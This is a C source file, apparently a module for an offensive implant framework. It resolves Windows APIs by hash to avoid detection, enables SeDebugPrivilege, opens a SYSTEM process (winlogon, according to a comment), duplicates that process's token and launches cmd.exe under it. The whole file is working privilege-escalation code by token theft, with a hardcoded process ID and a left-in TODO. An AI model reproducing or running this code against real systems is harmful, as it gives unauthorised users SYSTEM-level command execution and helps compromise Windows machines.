#include "run.h"

void run(char* output, DWORD* error)
{
#pragma region function-resolution
/// Resolve the address of KERNEL32.DLL via djb2 hash.
    LPVOID kernel32dll = NULL;
    kernel32dll = GetModuleByHash(KERNEL32DLL_HASH1);
    if (NULL == kernel32dll)
    {
        /// Resolve the address of kernel32.dll via djb2 hash.
        kernel32dll = GetModuleByHash(KERNEL32DLL_HASH2);
        if (NULL == kernel32dll)
        {
            /// Resolve the address of Kernel32.dll via djb2 hash.
            kernel32dll = GetModuleByHash(KERNEL32DLL_HASH3);
            if (NULL == kernel32dll) {
                return;
            }
        }
    }

    LOADLIBRARYA LoadLibraryAFunc;
    UINT64 msvcrtdll;
    STRLEN strlenFunc;
    CHAR loadlibrarya_c[] = "LoadLibraryA";
    LoadLibraryAFunc = _GetProcAddress((HANDLE)kernel32dll, loadlibrarya_c);
    CHAR msvcrt_c[] = "msvcrt.dll";
    msvcrtdll = (UINT64)((LOADLIBRARYA)LoadLibraryAFunc)(msvcrt_c);
    CHAR strlen_c[] = "strlen";
    strlenFunc = _GetProcAddress((HANDLE)msvcrtdll, strlen_c);
    
    UINT64 advapi32dll;
	OPENPROCESS OpenProcessFunc;
	GETCURRENTPROCESS GetCurrentProcessFunc;
	OPENPROCESSTOKEN OpenProcessTokenFunc;
	LOOKUPPRIVILEGEVALUEA LookupPrivilegeValueAFunc;
	ADJUSTTOKENPRIVILEGES AdjustTokenPrivilegesFunc;
	DUPLICATETOKENEX DuplicateTokenExFunc;
	CREATEPROCESSWITHTOKENW CreateProcessWithTokenWFunc;
	CHAR Advapi32_c[] = "advapi32.dll";
	advapi32dll = (UINT64)((LOADLIBRARYA)LoadLibraryAFunc)(Advapi32_c);
	CHAR openprocess_c[] = "OpenProcess";
	OpenProcessFunc = _GetProcAddress((HANDLE)kernel32dll,openprocess_c);
	CHAR getcurrentprocess_c[] = "GetCurrentProcess";
	GetCurrentProcessFunc = _GetProcAddress((HANDLE)kernel32dll,getcurrentprocess_c);
	CHAR openprocesstoken_c[] = "OpenProcessToken";
	OpenProcessTokenFunc = _GetProcAddress((HANDLE)advapi32dll,openprocesstoken_c);
	CHAR lookupprivilegevaluea_c[] = "LookupPrivilegeValueA";
	LookupPrivilegeValueAFunc = _GetProcAddress((HANDLE)advapi32dll,lookupprivilegevaluea_c);
	CHAR adjusttokenprivileges_c[] = "AdjustTokenPrivileges";
	AdjustTokenPrivilegesFunc = _GetProcAddress((HANDLE)advapi32dll,adjusttokenprivileges_c);
	CHAR duplicatetokenex_c[] = "DuplicateTokenEx";
	DuplicateTokenExFunc = _GetProcAddress((HANDLE)advapi32dll,duplicatetokenex_c);
	CHAR createprocesswithtokenw_c[] = "CreateProcessWithTokenW";
	CreateProcessWithTokenWFunc = _GetProcAddress((HANDLE)advapi32dll,createprocesswithtokenw_c);


   



    //Write Your code here
    //You send text back by using print or println by changing the VALUE_TO_PRINT 
    //to the string you want: "print(&output, strlenFunc, VALUE_TO_PRINT);
    //All Strings must be declared with the CHAR [] varname = ""; format.

    //Get SeDebugPrivs to be able to debug a process
    HANDLE Token;
    LUID luid;

    if (!OpenProcessTokenFunc(GetCurrentProcessFunc(), TOKEN_ADJUST_PRIVILEGES, &Token)) {
        
    }
    CHAR debugPriv[] = "SeDebugPrivilege";
    if (!LookupPrivilegeValueAFunc(NULL, debugPriv, &luid)) {
        
    }
    TOKEN_PRIVILEGES NewState;
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Luid = luid;
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivilegesFunc(Token, FALSE, &NewState, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        
    }


    //Now that I have the SeDebugPrivilege I can open a system process and steal its token to start a new process with it
    DWORD pid = 1504;
    HANDLE openedProcess;
    HANDLE AccessToken;

    //ADD CODE TO FIND WINLOGON.EXE PROCESS ID

    openedProcess = OpenProcessFunc(PROCESS_QUERY_INFORMATION, TRUE, pid);
    if (!openedProcess) {
        CHAR madeIt[] = "I opened the process...not!";
        println(&output, strlenFunc, madeIt);
        return;
    }

    OpenProcessTokenFunc(openedProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken);
    if (!AccessToken) {
        CHAR madeIt2[] = "I opened the token...not!";
        println(&output, strlenFunc, madeIt2);
    }

    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
    TOKEN_TYPE tokenType = TokenPrimary;
    HANDLE pNewToken;
    DuplicateTokenExFunc(AccessToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken);
    
    if (!pNewToken) {
        CHAR madeIt3[] = "I duplicated the token...not!";
        println(&output, strlenFunc, madeIt3);
        return;
    }


    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR proc[] = L"C:\\Windows\\System32\\cmd.exe";
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    int ret = CreateProcessWithTokenWFunc(pNewToken, LOGON_NETCREDENTIALS_ONLY, proc, NULL, NULL, NULL, NULL, &si, &pi);
    if (ret == 0)
    {
        CHAR madeIt4[] = "Didn't crash but process wasn't created. Not sure why";
        println(&output, strlenFunc, madeIt4);
    }
     
    return;
}
